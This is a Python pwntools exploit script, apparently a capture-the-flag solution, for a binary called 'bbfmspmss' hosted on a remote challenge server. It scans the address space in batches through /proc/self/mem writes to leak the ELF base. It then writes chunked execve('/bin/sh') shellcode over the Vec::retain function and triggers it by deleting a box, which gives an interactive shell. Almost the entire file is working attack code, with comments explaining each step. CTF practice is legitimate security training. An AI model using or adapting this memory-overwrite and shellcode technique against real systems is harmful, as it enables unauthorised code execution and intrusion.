import re
import sys
from pwn import *

context.arch = 'amd64'

path = './bbfmspmss'
host = '0.cloud.chals.io'
port = 26780

if len(sys.argv) > 1:
    p = gdb.debug(path, '''
        c
    ''', api=True, aslr=True)
else:
    p = remote(host, port)

def b():
    p.gdb.interrupt_and_wait()
    input("press any key to resume")
def numb(num):
    return str(num).encode('ascii')

# use /proc/self/mem write to identify valid address between [start, end)
# step is the size of the search window
# batch is the number of searches to do at once
# low batch parameter takes longer on remote but is more fine grained
# high batch parameter is faster but less fine grained
def search_addr(start, end, step, batch):
    elf_addr = None

    for base in range(start, end, step * batch):

        payload = bytearray()
        for guess_addr in range(base, base + step * batch, step):
            slot = guess_addr // 0x20
            assert(guess_addr % 0x20 == 0)

            payload += b'4\n'
            payload += b'/proc/self/mem\n'
            payload += numb(slot) + b'\n'
            payload += b'79\n'
            payload += b'\n'

        # cap off the payload with a list command so we know when it ends
        payload += b'3\n'

        p.sendafter(b'> ', payload)
        resp = p.recvuntil(b'--------------------------')

        if b'deposited!' in resp:
            elf_addr = base
            print(hex(elf_addr))
            break
        
        print(hex(base), end='\r')

    return elf_addr

# linear scan of address space to find the ELF base address
# our search space will be from around 0x550000000000 to 0x560000000000
# ELF is about (0x7c000 - 0x21000) in size, so we can use that as our search increment
# this will give a maximum of 5899680 attempts, which takes a while but isn't infeasible
start = 0x550000000000
end =   0x570000000000
step = 0x7c000 - 0x21000

N = 0x400

# first search in batches to find general region of base
result = search_addr(start, end, step, N)

# then we search this region a bit more carefully with no batching
# we start at result - step since if we hit on first part of batch, result is too late
result = search_addr(result - step, result + step * N, step, 1) - step

# finally we search with page granularity to obtain exact ELF base
# we start search at result - step for same reason as above
elf_base = search_addr(result - step, result + step, 0x1000, 1)

if result is None:
    log.info("couldn't find address!")
    sys.exit(1)

log.info(f"ELF base: 0x{elf_base:x}")

# we have leaked ELF base
# now we overwrite code of Vec::retain which is called when deleting a box
retain_addr = elf_base + 0xd090

# we can't actually write to 0xd090 due to 32 byte alignment constraint
# instead, we write to 0xd0a0 (0x10 bytes into retain)
retain_addr += 0x10
assert(retain_addr % 32 == 0)

# use specially crafted shellcode that runs in 8 byte chunks at 32 byte alignments
# source in shellcode.S
shellcode = bytes.fromhex("f7b82f736800eb1890909090909090909090909090909090909090909090909048c1e020eb1a909090909090909090909090909090909090909090909090909048052f62696eeb18909090909090909090909090909090909090909090909090504889e731f6eb1890909090909090909090909090909090909090909090909031d231c0eb1a9090909090909090909090909090909090909090909090909090b03b0f0590909090909090909090909090909090909090909090909090909090")

# grab first 8 bytes of each 32 byte blocks
# this will be what we put as the pocket monster number, which goes at first 8 bytes
blocks = [u64(shellcode[i:i+8]) for i in range(0, len(shellcode), 32)]

# deploy shellcode in blocks at retain_addr
slot = retain_addr // 32
for b in blocks:
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Box Name: ', b'/proc/self/mem')
    p.sendlineafter(b'Slot: ', numb(slot))
    p.sendlineafter(b'Number: ', numb(b))
    p.sendlineafter(b'Nickname: ', b'rust W')

    # assert that nothing went wrong
    assert(b'Input/output' not in p.recvuntil(b'Commands:\n'))

    slot += 1

# now we just delete a box to execute shellcode and win!
# we just need to put a file name that we have read/write access to
# ../db/boxes.db is an easy choice, but any existing box works
# this doesn't actually delete the file, since that happens
# after retain is called in delete_box
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Box Name: ', b'../db/boxes.db')

p.interactive()
